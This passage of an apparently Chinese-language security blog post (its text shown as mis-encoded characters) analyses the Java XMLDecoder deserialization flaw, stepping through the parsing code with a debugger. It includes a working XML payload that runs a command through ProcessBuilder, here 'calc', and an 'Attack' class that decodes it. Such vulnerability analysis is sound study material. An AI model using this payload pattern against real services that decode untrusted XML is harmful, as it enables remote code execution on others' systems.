&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ“ä½œç±»</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.XMLTest;<br><br><span class="hljs-keyword">import</span> java.beans.XMLDecoder;<br><span class="hljs-keyword">import</span> java.beans.XMLEncoder;<br><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo1</span> &#123;<br>    <span class="hljs-comment">// åºåˆ—åŒ–å¯¹è±¡åˆ°æ–‡ä»¶person.xml</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">xmlEncode</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> FileNotFoundException &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        person.setAge(<span class="hljs-number">18</span>);<br>        person.setName(<span class="hljs-string">&quot;test&quot;</span>);<br>        <span class="hljs-type">XMLEncoder</span> <span class="hljs-variable">xmlEncoder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLEncoder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;person.xml&quot;</span>)));<br>        xmlEncoder.writeObject(person);<br>        xmlEncoder.close();<br>        System.out.println(<span class="hljs-string">&quot;åºåˆ—åŒ–ç»“æŸï¼&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// ååºåˆ—åŒ–</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">xmlDecode</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> FileNotFoundException &#123;<br>        <span class="hljs-type">XMLDecoder</span> <span class="hljs-variable">xmlDecoder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLDecoder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;person.xml&quot;</span>)));<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> (Person)xmlDecoder.readObject();<br>        xmlDecoder.close();<br>        person.sayHello();<br>        System.out.println(person.getAge());<br>        System.out.println(person.getName());<br>        System.out.println(<span class="hljs-string">&quot;ååºåˆ—åŒ–æˆåŠŸ!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> FileNotFoundException &#123;<br>        <span class="hljs-type">Demo1</span> <span class="hljs-variable">xmlTest</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Demo1</span>();<br>        xmlTest.xmlEncode();<br>        xmlTest.xmlDecode();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241025133812826.png" alt="image-20241025133812826"></p><p>åºåˆ—åŒ–åçš„xmlç»“æ„</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">java</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.8.0_65&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;org.example.XMLTest.Person&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;age&quot;</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>18<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;name&quot;</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><br> <span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">java</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="åŸºäºsaxçš„xmlè§£æ"><a href="#åŸºäºSAXçš„XMLè§£æ" class="headerlink" title="åŸºäºSAXçš„XMLè§£æ"></a>åŸºäºSAXçš„XMLè§£æ</h2><p>æ¥ä¸‹æ¥è‡ªå·±å†™ä¸€ä¸ªåŸºäºSAXçš„xmlè§£æ</p><p>æˆ‘ä»¬åªè¦è·Ÿä¸€ä¸‹æºç å°±å¯ä»¥å‘ç°å®ƒå®ç°SAXå½¢å¼æ˜¯ç»§æ‰¿DefaultHandlerç±»çš„ï¼Œè¯¥ç±»åœ¨org.xml.sax.helpersåŒ…ä¸‹</p><p><img src="https://cdn.clown2024.cn/image-20241025135348967.png" alt="image-20241025135348967"></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.XMLTest;<br><br><span class="hljs-keyword">import</span> org.xml.sax.Attributes;<br><span class="hljs-keyword">import</span> org.xml.sax.SAXException;<br><span class="hljs-keyword">import</span> org.xml.sax.helpers.DefaultHandler;<br><br><span class="hljs-keyword">import</span> javax.xml.parsers.SAXParser;<br><span class="hljs-keyword">import</span> javax.xml.parsers.SAXParserFactory;<br><span class="hljs-keyword">import</span> java.io.File;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo2</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">DefaultHandler</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">SAXParserFactory</span> <span class="hljs-variable">saxParserFactory</span> <span class="hljs-operator">=</span> SAXParserFactory.newInstance();<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">SAXParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> saxParserFactory.newSAXParser();<br>            <span class="hljs-type">Demo2</span> <span class="hljs-variable">dh</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Demo2</span>();<br>            <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;person.xml&quot;</span>;<br>            <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(path);<br>            parser.parse(file, dh);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">characters</span><span class="hljs-params">(<span class="hljs-type">char</span>[] ch, <span class="hljs-type">int</span> start, <span class="hljs-type">int</span> length)</span> <span class="hljs-keyword">throws</span> SAXException &#123;<br>        System.out.println(<span class="hljs-string">&quot;characters()&quot;</span>);<br>        <span class="hljs-built_in">super</span>.characters(ch, start, length);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">startDocument</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SAXException &#123;<br>        System.out.println(<span class="hljs-string">&quot;startDocument()&quot;</span>);<br>        <span class="hljs-built_in">super</span>.startDocument();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">endDocument</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SAXException &#123;<br>        System.out.println(<span class="hljs-string">&quot;endDocument()&quot;</span>);<br>        <span class="hljs-built_in">super</span>.endDocument();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">startElement</span><span class="hljs-params">(String uri, String localName, String qName, Attributes attributes)</span> <span class="hljs-keyword">throws</span> SAXException &#123;<br>        System.out.println(<span class="hljs-string">&quot;startElement()&quot;</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; attributes.getLength(); i++) &#123;<br>            <span class="hljs-comment">// getQName()æ˜¯è·å–å±æ€§åç§°ï¼Œ</span><br>            System.out.println(attributes.getQName(i) + <span class="hljs-string">&quot;=&quot;</span> + attributes.getValue(i));<br>        &#125;<br>        <span class="hljs-built_in">super</span>.startElement(uri, localName, qName, attributes);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">endElement</span><span class="hljs-params">(String uri, String localName, String qName)</span> <span class="hljs-keyword">throws</span> SAXException &#123;<br>        System.out.println(<span class="hljs-string">&quot;endElement()&quot;</span>);<br>        System.out.println(uri + localName + qName);<br>        <span class="hljs-built_in">super</span>.endElement(uri, localName, qName);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åè§£æå‰é¢çš„person.xmlï¼Œç»“æœå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">startDocument()<br>startElement()<br>version=1.8.0_65<br>class=java.beans.XMLDecoder<br>characters()<br>startElement()<br>class=org.example.XMLTest.Person<br>characters()<br>startElement()<br>property=age<br>characters()<br>startElement()<br>characters()<br>endElement()<br>int<br>characters()<br>endElement()<br>void<br>characters()<br>startElement()<br>property=name<br>characters()<br>startElement()<br>characters()<br>endElement()<br>string<br>characters()<br>endElement()<br>void<br>characters()<br>endElement()<br>object<br>characters()<br>endElement()<br>java<br>endDocument()<br></code></pre></td></tr></table></figure><p>å¯ä»¥çŸ¥é“æˆ‘ä»¬å¯ä»¥é€šè¿‡ç»§æ‰¿SAXçš„DefaultHandlerç±»ï¼Œé‡å†™å…¶äº‹ä»¶æ–¹æ³•ï¼Œå°±èƒ½æ‹¿åˆ°XMLå¯¹åº”çš„èŠ‚ç‚¹ã€å±æ€§å’Œå€¼ã€‚</p><p>XMLDecoderä¹Ÿæ˜¯åŸºäºSAXå®ç°çš„xmlè§£æï¼Œä¸è¿‡ä»–æ‹¿åˆ°èŠ‚ç‚¹ã€å±æ€§ã€å€¼ä¹‹åé€šè¿‡Expressionåˆ›å»ºå¯¹è±¡åŠè°ƒç”¨æ–¹æ³•ã€‚</p><h1 id="ååºåˆ—åŒ–æ¼æ´åŸç†"><a href="#ååºåˆ—åŒ–æ¼æ´åŸç†" class="headerlink" title="ååºåˆ—åŒ–æ¼æ´åŸç†"></a>ååºåˆ—åŒ–æ¼æ´åŸç†</h1><p>æ¦‚æ‹¬æ¥è¯´ï¼ŒXMLDecoderäº§ç”Ÿæ¼æ´çš„åŸå› ä¸»è¦æœ‰ä»¥ä¸‹å‡ ä¸ªå…³é”®å› ç´ ï¼š</p><ul><li>XMLDecoderæ˜¯javaè‡ªå¸¦çš„ä»¥SAXæ–¹å¼è§£æxmlçš„ç±»ï¼Œå…¶åœ¨ååºåˆ—åŒ–ç»è¿‡ç‰¹æ®Šæ„é€ çš„XMLæ•°æ®å¯ä»¥è¦†ç›–å¯¹åº”Beansæˆå‘˜å€¼ï¼Œè¿™ç»™æ„é€ gadgetäº§ç”Ÿäº†å¯èƒ½ã€‚</li><li>XMLDecoderä½¿ç”¨åå°„æ¥åŠ¨æ€ç”ŸæˆBeansï¼Œè¿™ç»™è§¦å‘gadgetäº§ç”Ÿäº†å¯èƒ½ã€‚</li></ul><p>ä»¥ä¸Šä¸¤ä¸ªæ¡ä»¶åŒæ—¶éƒ½å…·å¤‡ï¼Œä½¿å¾—XMLDecoderäº§ç”Ÿè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´çš„æ”»å‡»é¢ã€‚</p><h2 id="æµç¨‹åˆ†æ"><a href="#æµç¨‹åˆ†æ" class="headerlink" title="æµç¨‹åˆ†æ"></a>æµç¨‹åˆ†æ</h2><p>è¿™é‡Œç”¨ä¸€ä¸ªå¼¹è®¡ç®—å™¨çš„payloadå»åˆ†æä¸€ä¸‹</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">java</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">array</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.String&quot;</span> <span class="hljs-attr">length</span>=<span class="hljs-string">&quot;1&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">index</span>=<span class="hljs-string">&quot;0&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>calc<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">array</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;start&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">java</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.XMLTest;<br><br><span class="hljs-keyword">import</span> java.beans.XMLDecoder;<br><span class="hljs-keyword">import</span> java.io.BufferedInputStream;<br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Attack</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        File file=<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;payload.xml&quot;</span>);<br>        FileInputStream fileInputStream=<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(file);<br>        BufferedInputStream bufferedInputStream=<span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(fileInputStream);<br>        XMLDecoder xmlDecoder=<span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLDecoder</span>(bufferedInputStream);<br>        xmlDecoder.readObject();<br>        xmlDecoder.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥ç›´æ¥åœ¨ProcessBuilder#startå¤„æ‰“ä¸ªæ–­ç‚¹ç„¶åä»è°ƒç”¨æ ˆå¸§å¼€å§‹çœ‹</p><p><img src="https://cdn.clown2024.cn/image-20241025230809734.png" alt="image-20241025230809734"></p><p>ä»–æ˜¯ä»readObjectæ–¹æ³•å¼€å§‹çš„ï¼Œæˆ‘ä»¬ä»é‚£é‡Œå¼€å§‹è·Ÿè¿›</p><p><img src="https://cdn.clown2024.cn/image-20241025231157408.png" alt="image-20241025231157408"></p><p>è·Ÿè¿›åˆ°XMLDecoder#parsingCompleteæ–¹æ³•ï¼Œè¿™é‡Œä¼šè°ƒç”¨DocumentHandlerè¿›è¡Œxmlçš„è§£æ</p><p><img src="https://cdn.clown2024.cn/image-20241025231439438.png" alt="image-20241025231439438"></p><p>è¿™ä¸ªhandlerå°±æ˜¯ç»§æ‰¿DefaultHandlerç±»çš„ï¼Œè°ƒç”¨ä»–çš„parseæ¥å¯¹è¾“å…¥inputè¿›è¡Œè§£æï¼Œä¹Ÿå°±æ˜¯ä»¥SAXæ–¹å¼è§£æ</p><p><img src="https://cdn.clown2024.cn/image-20241026004719002.png" alt="image-20241026004719002"></p><p>è¿›åˆ°æ–¹æ³•é‡Œé¢ï¼Œä»–çš„è§£æå†™æ³•ä¹Ÿå’Œæˆ‘ä»¬å‰é¢å†™çš„é€»è¾‘æ˜¯ä¸€æ ·çš„ï¼Œéƒ½è¦åˆ›å»ºä¸€ä¸ªSAXParserï¼Œç„¶åæ¥ä¸‹æ¥çš„è§£æå°±é‡ç‚¹å»å…³æ³¨ä¸€ä¸‹ä»–çš„è§£æå‡½æ•°ï¼Œæˆ‘ä»¬ç»§ç»­è·Ÿè¿›</p><p>åœ¨DocumentHandlerçš„æ„é€ æ–¹æ³•ä¸­æŒ‡å®šäº†å¯ç”¨çš„æ ‡ç­¾ç±»å‹</p><p><img src="https://cdn.clown2024.cn/image-20241026005350433.png" alt="image-20241026005350433"></p><p>å¯¹åº”äº†com.sun.beans.decoderåŒ…ä¸­ç±»</p><p>æˆ‘ä»¬æ–­åœ¨DocumentHandler#startElementæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241026012931997.png" alt="image-20241026012931997"></p><p>ä»–é¦–å…ˆè§£æjavaæ ‡ç­¾ï¼Œè®¾ç½®Ownerå’ŒParent,ownerå°±æ˜¯DocumentHandlerç±»ï¼ŒgetElementHandleræ–¹æ³•å°±æ˜¯ä»DocumentHandleræ„é€ æ–¹æ³•æ—¶åˆ›å»ºçš„mapä¸­å–å¯¹åº”çš„classï¼Œå¦‚æœæ²¡æœ‰åˆ™ä¼šæŠ›å‡ºå¼‚å¸¸</p><p><img src="https://cdn.clown2024.cn/image-20241026014426012.png" alt="image-20241026014426012"></p><p>ç„¶ååˆ°è§£æobjectæ ‡ç­¾çš„æ—¶å€™ï¼Œä¼šå»æ‹¿nameå’Œvalueä¹Ÿå°±æ˜¯classå’ŒProcessBuilder</p><p>ç„¶åå°±æ˜¯é€šè¿‡addAttributeæ¥æ·»åŠ å±æ€§</p><p><img src="https://cdn.clown2024.cn/image-20241026014707208.png" alt="image-20241026014707208"></p><p>è¿™é‡Œè¿˜ä¼šè°ƒç”¨findClassï¼Œè¿™é‡Œæ˜¯ç½‘ä¸Šèµ°åˆ°äº†çˆ¶ç±»NewElementHandlerçš„è¿™ä¸ªæ–¹æ³•</p><p>ç„¶åå°±æ˜¯è§£æarrayæ ‡ç­¾ï¼ŒåŒæ ·æ·»åŠ å±æ€§ï¼Œåé¢å°±æ˜¯é‡å¤çš„è¿‡ç¨‹ï¼Œè‡ªå·±è°ƒè¯•çœ‹ä¸€éå³å¯</p><p>è§£æå®Œå¼€å§‹æ ‡ç­¾å°±åˆ°é—­åˆæ ‡ç­¾äº†</p><p>è¿›å…¥åˆ°endElementæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241026015510343.png" alt="image-20241026015510343"></p><p>é¦–å…ˆå°±æ˜¯é—­åˆçš„stringæ ‡ç­¾</p><p><img src="https://cdn.clown2024.cn/image-20241026015649368.png" alt="image-20241026015649368"></p><p>æ¥ç€é—­åˆvoidå’Œarray</p><p>ç„¶åè§£ævoidæ ‡ç­¾çš„çš„methodå±æ€§</p><p><img src="https://cdn.clown2024.cn/image-20241026015858555.png" alt="image-20241026015858555"></p><p>å°†this.methodèµ‹å€¼ä¸ºstartï¼Œç„¶åç´§æ¥ç€åˆæ˜¯ç›¸å…³çš„é—­åˆæ“ä½œ</p><p>ä¸­é—´çš„å¾ˆå¤šå¤§åŒå°å¼‚çš„æµç¨‹å°±ä¸è®°å½•äº†ï¼Œçœ‹çœ‹æ–‡ç« å³å¯</p><p>æœ€ç»ˆèµ°åˆ°å…³é”®çš„åœ°æ–¹<strong>ObjectElementHandler#getValueObject</strong>æ–¹æ³•é‡Œ</p><p><img src="https://cdn.clown2024.cn/image-20241026020414044.png" alt="image-20241026020414044"></p><p>è¿™é‡Œæ˜¯æ„å»ºäº†ä¸€ä¸ªjava.beans.Expressionè¡¨è¾¾å¼ç±»</p><p><img src="https://cdn.clown2024.cn/image-20241026020515551.png" alt="image-20241026020515551"></p><p>ç„¶åçœ‹Expressionçš„getValueæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241026020824998.png" alt="image-20241026020824998"></p><p>é‡Œé¢ä¼šè°ƒç”¨invokeæ–¹æ³•ï¼Œä¼šèµ°åˆ°å…¶çˆ¶ç±»Statementçš„invokeæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241026021017273.png" alt="image-20241026021017273"></p><p><img src="https://cdn.clown2024.cn/image-20241026021656440.png" alt="image-20241026021656440"></p><p>å†…éƒ¨å°±æ˜¯åˆ©ç”¨åå°„æ¥è¿›è¡Œæ–¹æ³•è°ƒç”¨</p><p><img src="https://cdn.clown2024.cn/image-20241026021040905.png" alt="image-20241026021040905"></p><p>æœ€ç»ˆå°±ä¼šè¿”å›ProcessBuilderè¿™ä¸ªç±»ï¼Œç»§ç»­å¾€å</p><p><img src="https://cdn.clown2024.cn/image-20241026021157722.png" alt="image-20241026021157722"></p><p>åˆ°è¿™é‡Œä»–å°±ä¼šæ‰§è¡Œstartæ–¹æ³•ï¼Œå†…éƒ¨ä¹Ÿæ˜¯åå°„è°ƒç”¨startæ–¹æ³•ï¼Œåç»­çš„æ­¥éª¤ä¹Ÿæ˜¯å·®ä¸å¤šçš„å°±ä¸è°ƒäº†</p><p>æœ€ç»ˆå°±æ˜¯ç›¸å½“äºæœ€åæ‹¼æ¥äº†ä¸€ä¸ªè¡¨è¾¾å¼ï¼š<strong>new java.lang.ProcessBuilder(new String[]{â€œcalcâ€}).start();</strong></p><h2 id="expressionå’Œstatement"><a href="#Expressionå’ŒStatement" class="headerlink" title="Expressionå’ŒStatement"></a>Expressionå’ŒStatement</h2><p>ä¸¤è€…éƒ½æ˜¯javaåå°„çš„å°è£…</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.XMLTest;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> id;<br>    <span class="hljs-keyword">private</span> String name;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;User&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;id=&quot;</span> + id +<br>                <span class="hljs-string">&quot;, name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> id;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(<span class="hljs-type">int</span> id)</span> &#123;<br>        <span class="hljs-built_in">this</span>.id = id;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-keyword">return</span> String.format(<span class="hljs-string">&quot;ä½ å¥½ %s!&quot;</span>, name);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.XMLTest;<br><br><span class="hljs-keyword">import</span> java.beans.Expression;<br><span class="hljs-keyword">import</span> java.beans.Statement;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        testStatement();<br>        testExpression();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testStatement</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br>            <span class="hljs-type">Statement</span> <span class="hljs-variable">statement</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Statement</span>(user, <span class="hljs-string">&quot;setName&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;å¼ ä¸‰&quot;</span>&#125;);<br>            statement.execute();<br>            System.out.println(user.getName());<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testExpression</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br>            <span class="hljs-type">Expression</span> <span class="hljs-variable">expression</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Expression</span>(user, <span class="hljs-string">&quot;sayHello&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;å°æ˜&quot;</span>&#125;);<br>            System.out.println(expression.getValue());<span class="hljs-comment">//å¯ä»¥è·å–è¿”å›å€¼</span><br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">å¼ ä¸‰<br>ä½ å¥½ å°æ˜!<br></code></pre></td></tr></table></figure><p>ä»–ä»¬çš„åŒºåˆ«å°±æ˜¯Expressionçš„getValueå†…éƒ¨æ‰§è¡Œinvokeæ–¹æ³•åèƒ½å¤Ÿè·å–è¿”å›å€¼ï¼Œè€ŒStatementæ˜¯æ²¡æœ‰getValueæ–¹æ³•æ˜¯è·å–ä¸äº†è¿”å›å€¼çš„</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>XMLDecoderå¯¼è‡´æ¼æ´çš„åŸå› å°±åœ¨äºå¤„ç†èŠ‚ç‚¹çš„æ—¶å€™ï¼Œä¿¡ä»»äº†å¤–éƒ¨è¾“å…¥çš„XMLæŒ‡å®šèŠ‚ç‚¹ç±»å‹ä¿¡æ¯ï¼ˆclassç±»å‹èŠ‚ç‚¹ï¼‰ï¼ŒåŒæ—¶åœ¨è¿›è¡ŒèŠ‚ç‚¹ExpressionåŠ¨æ€å®ä¾‹åŒ–çš„æ—¶å€™ï¼ˆé€šè¿‡invokeå®ç°set()æ–¹æ³•ï¼Œå…è®¸èŠ‚ç‚¹å±æ€§ç”±XMLä»»æ„æ§åˆ¶</p><p>å¯¼è‡´Expressionçš„set()æ–¹æ³•è¢«é‡è½½ä¸ºé£é™©å‡½æ•°ï¼ˆæœ¬ä¾‹ä¸­æ˜¯startï¼‰ã€‚ExpressionåŠ¨æ€è§£æå› ä¸ºJavaåå°„ç‰¹æ€§å®ç°äº†ä»£ç æ‰§è¡Œã€‚</p><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://y4er.com/posts/java-xmldecoder">https://y4er.com/posts/java-xmldecoder</a></p><p><a href="https://www.cnblogs.com/LittleHann/p/17814641.html">https://www.cnblogs.com/LittleHann/p/17814641.html</a></p>]]></content>
    
    
      
      
